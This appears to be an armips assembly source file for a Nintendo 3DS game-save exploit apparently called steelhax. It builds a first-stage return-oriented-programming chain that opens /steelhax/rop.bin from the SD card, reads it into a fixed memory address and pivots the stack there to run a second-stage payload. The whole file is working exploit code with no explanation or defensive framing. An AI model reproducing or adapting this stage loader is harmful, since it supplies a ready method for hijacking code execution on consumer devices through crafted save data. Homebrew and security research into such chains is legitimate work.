.nds

.include "steel_save/steel_constants.s"
.include "steel_save/steel_macros.s"

.create "build/initial_rop.bin", STEEL_ROP_BASE

rop:
	FSUSER_OpenFileDirectly file_handle, 0x0, ARCH_SDMC, PATH_EMPTY, empty_string, 0x1, PATH_ASCII, roppath, roppath_end-roppath, FS_OPEN_READ, 0x0
	FSFILE_GetSize file_handle, file_size
	FSFILE_Read file_handle, bytes_read, 0, 0, STEEL_SECOND_ROP_BASE, file_size
	FSFILE_Close file_handle

	setR0 STEEL_SECOND_ROP_BASE
	setR1 STEEL_ROP_NOP
	.word STEEL_ROP_MOV_SPR0_REGSTUFF_BX_R1
	
file_handle:
	.word 0x0
empty_string:
	.word 0x0
file_size:
	.word 0x0
bytes_read:
	.word 0x0
roppath:
	.ascii "/steelhax/rop.bin", 0
	.halfword 0x00					; need padding
roppath_end:
.close